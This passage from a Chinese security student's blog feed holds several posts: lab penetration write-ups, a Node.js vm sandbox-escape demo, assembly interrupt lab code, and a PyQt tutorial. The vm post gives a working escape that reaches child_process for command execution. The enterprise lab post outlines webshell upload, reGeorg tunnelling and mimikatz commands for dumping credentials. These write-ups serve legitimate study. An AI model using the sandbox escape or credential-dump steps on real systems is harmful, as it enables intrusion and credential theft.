interface.</span><br><span class="line">;dev tap</span><br><span class="line">dev tun</span><br><span class="line"></span><br><span class="line"># Windows needs the TAP-Win32 adapter name</span><br><span class="line"># from the Network Connections panel</span><br><span class="line"># if you have more than one.  On XP SP2,</span><br><span class="line"># you may need to disable the firewall</span><br><span class="line"># for the TAP adapter.</span><br><span class="line">;dev-node MyTap</span><br><span class="line"></span><br><span class="line"># Are we connecting to a TCP or</span><br><span class="line"># UDP server?  Use the same setting as</span><br><span class="line"># on the server.</span><br><span class="line">;proto tcp</span><br><span class="line">proto udp</span><br><span class="line"></span><br><span class="line"># The hostname&#x2F;IP and port of the server.</span><br><span class="line"># You can have multiple remote entries</span><br><span class="line"># to load balance between the servers.</span><br><span class="line">remote 192.168.1.6 1194</span><br><span class="line">;remote my-server-2 1194</span><br><span class="line"></span><br><span class="line"># Choose a random host from the remote</span><br><span class="line"># list for load-balancing.  Otherwise</span><br><span class="line"># try hosts in the order specified.</span><br><span class="line">;remote-random</span><br><span class="line"></span><br><span class="line"># Keep trying indefinitely to resolve the</span><br><span class="line"># host name of the OpenVPN server.  Very useful</span><br><span class="line"># on machines which are not permanently connected</span><br><span class="line"># to the internet such as laptops.</span><br><span class="line">resolv-retry infinite</span><br><span class="line"></span><br><span class="line"># Most clients don&#39;t need to bind to</span><br><span class="line"># a specific local port number.</span><br><span class="line">nobind</span><br><span class="line"></span><br><span class="line"># Downgrade privileges after initialization (non-Windows only)</span><br><span class="line">;user nobody</span><br><span class="line">;group nobody</span><br><span class="line"></span><br><span class="line"># Try to preserve some state across restarts.</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line"># If you are connecting through an</span><br><span class="line"># HTTP proxy to reach the actual OpenVPN</span><br><span class="line"># server, put the proxy server&#x2F;IP and</span><br><span class="line"># port number here.  See the man page</span><br><span class="line"># if your proxy server requires</span><br><span class="line"># authentication.</span><br><span class="line">;http-proxy-retry # retry on connection failures</span><br><span class="line">;http-proxy [proxy server] [proxy port #]</span><br><span class="line"></span><br><span class="line"># Wireless networks often produce a lot</span><br><span class="line"># of duplicate packets.  Set this flag</span><br><span class="line"># to silence duplicate packet warnings.</span><br><span class="line">;mute-replay-warnings</span><br><span class="line"></span><br><span class="line"># SSL&#x2F;TLS parms.</span><br><span class="line"># See the server config file for more</span><br><span class="line"># description.  It&#39;s best to use</span><br><span class="line"># a separate .crt&#x2F;.key file pair</span><br><span class="line"># for each client.  A single ca</span><br><span class="line"># file can be used for all clients.</span><br><span class="line">ca ca.crt</span><br><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br><span class="line"></span><br><span class="line"># Verify server certificate by checking</span><br><span class="line"># that the certicate has the nsCertType</span><br><span class="line"># field set to &quot;server&quot;.  This is an</span><br><span class="line"># important precaution to protect against</span><br><span class="line"># a potential attack discussed here:</span><br><span class="line">#  http:&#x2F;&#x2F;openvpn.net&#x2F;howto.html#mitm</span><br><span class="line">#</span><br><span class="line"># To use this feature, you will need to generate</span><br><span class="line"># your server certificates with the nsCertType</span><br><span class="line"># field set to &quot;server&quot;.  The build-key-server</span><br><span class="line"># script in the easy-rsa folder will do this.</span><br><span class="line">;ns-cert-type server</span><br><span class="line"></span><br><span class="line"># If a tls-auth key is used on the server</span><br><span class="line"># then every client must also have the key.</span><br><span class="line">tls-auth ta.key 1</span><br><span class="line"></span><br><span class="line"># Select a cryptographic cipher.</span><br><span class="line"># If the cipher option is used on the server</span><br><span class="line"># then you must also specify it here.</span><br><span class="line">cipher AES-256-CBC</span><br><span class="line"></span><br><span class="line"># Enable compression on the VPN link.</span><br><span class="line"># Don&#39;t enable this unless it is also</span><br><span class="line"># enabled in the server config file.</span><br><span class="line">;comp-lzo</span><br><span class="line"></span><br><span class="line"># Set log file verbosity.</span><br><span class="line">verb 3</span><br><span class="line"></span><br><span class="line"># Silence repeating messages</span><br><span class="line">mute 20</span><br></pre></td></tr></table></figure><p>连接报错，</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619815.png" alt></p><blockquote><p>google 知道是时间不同步，手动修改Windows时间正常连接</p></blockquote><p>权限不够</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619826.png" alt></p><blockquote><p>管理员身份打开命令行，cd到配置文件目录下，输入 openvpn 配置文件名 即可</p></blockquote><p>无法ping 通</p><p><img src= "/img/loading.gif" data-src="https://note.youdao.com/yws/public/resource/1fad93d26e758145d0fe5ef5484d707f/xmlnote/880F9FEB76CC451983ACD136DC135B02/2778" alt></p><p>需要修改服务端配置文件</p><p>成功连接后可以访问到 192.168.2.3</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620274.png" alt></p><p>弱口令登录 phpmyadmin，得到后台密码 1q2w3e4r</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620440.png" alt></p><p>将工具拷贝到 192.168.1.5 中</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620712.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620757.png" alt></p><p>getshell</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620817.png" alt></p><p>最后得到key</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319621019.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js沙箱逃逸</title>
      <link href="/posts/55470809/"/>
      <url>/posts/55470809/</url>
      
        <content type="html"><![CDATA[<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`let a = "welcome!";a;`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure><p>打印出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome</span><br></pre></td></tr></table></figure><p>如果换成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`process`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src= "/img/loading.gif" data-src="/posts/55470809/1589114675198.png" alt></p><p>因为 <code>process</code> 是没有定义的</p><p>但是我们可以通过这样来获取到系统的环境变量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`this.constructor.constructor('return this.process.env')()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure><p>因为 <code>this</code> 指向了一个外部的对象，<code>this.conatructor</code> 指向的就是 Object 对象的 <code>Constructor</code> ， 而 <code>object constructor</code> 返回的就是 <code>Function constructor</code></p><p>完成 RCE</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('dir').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/55470809/1589114918266.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土八</title>
      <link href="/posts/90d750b6/"/>
      <url>/posts/90d750b6/</url>
      
        <content type="html"><![CDATA[<h2 id="中断处理的流程-牢记"><a href="#中断处理的流程-牢记" class="headerlink" title="中断处理的流程(牢记)"></a>中断处理的流程(牢记)</h2><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/clipboard.png" alt></p><p>关于第三步</p><p>为什么要设置第8位 TF？</p><p>这就涉及到debug程序的原理：</p><blockquote><p>debug的原理，通过设置 TF 为1，引发单步中断去执行debug准备好的中断代码</p><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/1588129690345.png" alt></p></blockquote><p>但是这样会有问题，在处理中断的时候是不能去触发单步中断的，所以CPU要提前设置TF为0</p><p>中断过程具体的操作</p><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/1588129813844.png" alt></p><h2 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,offset do0</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,200H</span><br><span class="line">    </span><br><span class="line">    mov cx,offset do0end-offset do0</span><br><span class="line">    </span><br><span class="line">    rep movsb</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov word ptr es:[0],200H</span><br><span class="line">    mov word ptr es:[2],0</span><br><span class="line"></span><br><span class="line">    mov ax, 1000h</span><br><span class="line">    mov bh, 1</span><br><span class="line">    div bh</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line"></span><br><span class="line">do0:</span><br><span class="line">    jmp short do0start</span><br><span class="line">    db &quot;divide error!&quot;</span><br><span class="line">do0start:</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,202H</span><br><span class="line">    mov ax,0B800H</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,12*160+33*2;这里要注意一下，不能因为字符串长度为13，为了居中输出就设置成12*160+67，会出现意想不到的情况</span><br><span class="line">    mov cx,13</span><br><span class="line">    s:</span><br><span class="line">    mov al,[si]</span><br><span class="line">    mov es:[di],al</span><br><span class="line">    inc si</span><br><span class="line">    add di,2</span><br><span class="line">    loop s</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line">do0end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>通过 <code>offset</code> 获得偏移地址</p><p>通过 <code>rep movsb</code> 来拷贝 do0 程序</p><blockquote><p>这里特别注意，do0 要使用的字符串必须存储在 do0 子程序中，并且需要手动计算一下字符串的位置</p></blockquote><p>当然最后还需要来触发这个中断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1000h</span><br><span class="line">mov bh, 1</span><br><span class="line">div bh</span><br></pre></td></tr></table></figure><p>如果直接存放原来data中的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">db &quot;overflow!&quot;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,offset do0</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,200H</span><br><span class="line">    </span><br><span class="line">    mov cx,offset do0end-offset do0</span><br><span class="line">    </span><br><span class="line">    rep movsb</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov word ptr es:[0],200H</span><br><span class="line">    mov word ptr es:[2],0</span><br><span class="line"></span><br><span class="line">    mov ax, 1000h</span><br><span class="line">    mov bh, 1</span><br><span class="line">    div bh</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line"></span><br><span class="line">do0:</span><br><span class="line">    mov ax,data</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,0</span><br><span class="line">    mov ax,0B800H</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,12*160+33*2</span><br><span class="line">    mov cx,13</span><br><span class="line">    s:</span><br><span class="line">    mov al,[si]</span><br><span class="line">    mov es:[di],al</span><br><span class="line">    inc si</span><br><span class="line">    add di,2</span><br><span class="line">    loop s</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line">do0end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>也是可以执行的</p><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/1588131368497.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>企业环境渗透一</title>
      <link href="/posts/c7cfd527/"/>
      <url>/posts/c7cfd527/</url>
      
        <content type="html"><![CDATA[<h2 id="任务一-后台文件上传"><a href="#任务一-后台文件上传" class="headerlink" title="任务一 后台文件上传"></a>任务一 后台文件上传</h2><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p><p>1.1 使用目录扫描工具对目标网站的后台地址进行扫描(如wwwscan)</p><p>1.2 使用Burpsuite工具爆破后台管理员密码</p><p>1.3 使用爆破出的管理员密码登录后台，并上传一句话木马</p><p>1.4 使用中国菜刀连接一句话木马</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588072738413.png" alt></p><p>得到后台登陆地址为 <code>manager/login.php</code></p><p>同时发现扫描出了 <code>/myadmin</code> ，猜测是 <code>phpmyadmin</code></p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073088324.png" alt></p><p>弱口令 root ， root试一下，成功登陆</p><p>在数据库中发现了用户名和密码</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073175463.png" alt></p><p>md5解密：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073186989.png" alt></p><p>成功登陆后台，得到 falg1</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073231030.png" alt></p><h2 id="任务二-sql注入"><a href="#任务二-sql注入" class="headerlink" title="任务二 sql注入"></a>任务二 sql注入</h2><ol><li>利用之前扫描目录得到的结果访问到测试的sql，利用SQL注入漏洞获得网站数据库信息</li><li>构造SQL注入语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>访问存在SQL注入漏洞的页面，表的字段为10</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073668068.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073693517.png" alt></p><p>尝试联合注入失败</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074070981.png" alt></p><p>可以直接登陆后台，并修改配置：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074131115.png" alt></p><p>然后就可以从后台上传php文件了</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074182455.png" alt></p><p>成功上传</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074223735.png" alt></p><p>使用菜刀进行连接</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074257325.png" alt></p><p>flag</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074320768.png" alt></p><h2 id="任务三-phpmyadmin-写shell"><a href="#任务三-phpmyadmin-写shell" class="headerlink" title="任务三 phpmyadmin 写shell"></a>任务三 phpmyadmin 写shell</h2><ol><li>用之前扫描目录的结果访问phpmyadmin页面，利用弱口令登录到 <code>phpmyadmin</code> 服务中</li><li>构造SQL语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>弱口令登录 phpmyadmin，访问到flag表得到flag</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074309330.png" alt></p><h2 id="任务四-扫描PC端并登陆"><a href="#任务四-扫描PC端并登陆" class="headerlink" title="任务四 扫描PC端并登陆"></a>任务四 扫描PC端并登陆</h2><ol><li>利用已经获取到权限的web机器，上传扫描脚本对内网中的其他主机进行扫描</li><li>利用web代理工具代理访问内网的主机，使用之前数据库中获得的账号密码进行登录</li></ol><p>上传 <code>RAScan.py</code>，扫描</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121789196.png" alt></p><p>扫描结果</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121802724.png" alt></p><p>可以看到 192.168.2.11 和 192.168.2.10 都开放了3389端口</p><p>上传 <code>tunnel.nosocket.php</code>，访问：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121885782.png" alt></p><p>然后使用 <code>reGeorgSocksProxy.py</code> 开启代理</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121921831.png" alt></p><p>打开 <code>Proxifier</code>，新建连接</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121958945.png" alt></p><p>然后设置规则：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121982402.png" alt></p><p>远程登陆 192.168.2.11</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122014576.png" alt></p><p>回过头来看数据库，密码是 <code>topsec.123</code></p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121697982.png" alt></p><p>成功连接</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122024967.png" alt></p><p>flag在C盘根目录</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122036042.png" alt></p><h2 id="任务五-抓取域控密码并登陆域控"><a href="#任务五-抓取域控密码并登陆域控" class="headerlink" title="任务五 抓取域控密码并登陆域控"></a>任务五 抓取域控密码并登陆域控</h2><ol><li>利用已经登陆到远程桌面的机器，上传mimikatz工具抓取机器内存中的密码</li><li>利用抓取到的密码登陆到另一台机器2.10中</li></ol><p>上传 <code>mimikatz</code> 到 192.168.2.11 的桌面</p><p>以管理员身份运行，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>得到密码</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122108804.png" alt></p><p>远程登陆 192.168.2.10</p><p>flag在C盘根目录</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口转发</title>
      <link href="/posts/c0e91c93/"/>
      <url>/posts/c0e91c93/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pyqt入门</title>
      <link href="/posts/341a7d9a/"/>
      <url>/posts/341a7d9a/</url>
      
        <content type="html"><![CDATA[<p>编写一个简单地GUI应用如下</p><p><img src= "/img/loading.gif" data-src="/posts/341a7d9a/1587693985383.png" alt></p><p>拖动进度条，下面两个框框会显示不同的数据</p><p>输入姓名，点击设置姓名，下面的框框回回显数据</p><p>点击关闭按钮关闭窗口</p><h2 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h2><p>妥妥拽拽即可</p><p><img src= "/img/loading.gif" data-src="/posts/341a7d9a/1587694105991.png" alt></p><p>两个 <code>groupbox</code> 布局可以通过</p><p><img src= "/img/loading.gif" data-src="/posts/341a7d9a/1587694167654.png" alt></p><p>进行设置</p><h2 id="信号和槽"><a href="#信号和槽" class="headerlink" title="信号和槽"></a>信号和槽</h2><p>关闭按钮的信号直接通过拖动即可关联</p><h3 id="自定义信号"><a href="#自定义信号" class="headerlink" title="自定义信号"></a>自定义信号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QObject,pyqtSlot,pyqtSignal</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">human</span><span class="params">(QObject)</span>:</span></span><br><span class="line">    nameChanged = pyqtSignal(str)</span><br><span class="line">    ageChanged = pyqtSignal([int], [str])</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name=<span class="string">"Mike"</span>, age=<span class="number">10</span>,parent=None)</span>:</span></span><br><span class="line">        super().__init__(parent)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setAge</span><span class="params">(self, age)</span>:</span></span><br><span class="line">        self._age = age</span><br><span class="line">        self.ageChanged.emit(self._age)</span><br><span class="line">        <span class="keyword">if</span> age&lt;=<span class="number">18</span>:</span><br><span class="line">            ageInfo=<span class="string">"你是 少年"</span></span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">18</span>&lt; age &lt;=<span class="number">35</span>):</span><br><span class="line">            ageInfo=<span class="string">"你是 年轻人"</span></span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">35</span>&lt; age &lt;=<span class="number">55</span>):</span><br><span class="line">            ageInfo=<span class="string">"你是 中年人"</span></span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">55</span>&lt; age &lt;=<span class="number">80</span>):</span><br><span class="line">            ageInfo=<span class="string">"您是 老人"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ageInfo=<span class="string">"您是 寿星啊"</span></span><br><span class="line">        self.ageChanged[str].emit(ageInfo)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setName</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self._name = name</span><br><span class="line">        self.nameChanged.emit(self._name)</span><br></pre></td></tr></table></figure><p>自定义两个信号 <code>nameChanged</code> 和 <code>ageChanged</code></p><p>自定义槽函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyWidget</span><span class="params">(QWidget)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,parent=None)</span>:</span></span><br><span class="line">        super().__init__(parent=parent)</span><br><span class="line">        </span><br><span class="line">        self._ui = Ui_Widget()</span><br><span class="line">        self._ui.setupUi(self)</span><br><span class="line">        self.body = human(<span class="string">"Mike"</span>, <span class="number">20</span>)</span><br><span class="line">        </span><br><span class="line">        self.body.nameChanged.connect(self.do_nameChanged)</span><br><span class="line">        self.body.ageChanged.connect(self.do_ageChanged_int)</span><br><span class="line">        self.body.ageChanged[str].connect(self.do_ageChanged_str)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_horizontalSlider_valueChanged</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self.body.setAge(value)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_pushButton_clicked</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        当按钮点击时候自动触发该槽函数</span></span><br><span class="line"><span class="string">        从输入框中获取到输入的姓名，接着调用body的setName方法，setName方法会放出一个信号，由于之前设置的连接，直接触发do_nameChanged槽函数</span></span><br><span class="line"><span class="string">        '''</span>    </span><br><span class="line">        hisName = self._ui.lineEdit_5.text()</span><br><span class="line">        self.body.setName(hisName)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 自定义的槽函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_nameChanged</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self._ui.editNameHello.setText(<span class="string">"Hello"</span>+name)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_ageChanged_int</span><span class="params">(self,age)</span>:</span></span><br><span class="line">        self._ui.editAgeStr.setText(str(age))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @pyqtSlot(str)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_ageChanged_str</span><span class="params">(self,ageInfo)</span>:</span></span><br><span class="line">        self._ui.editAgeInt.setText(ageInfo)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实现KMP算法</title>
      <link href="/posts/9bd3a30d/"/>
      <url>/posts/9bd3a30d/</url>
      
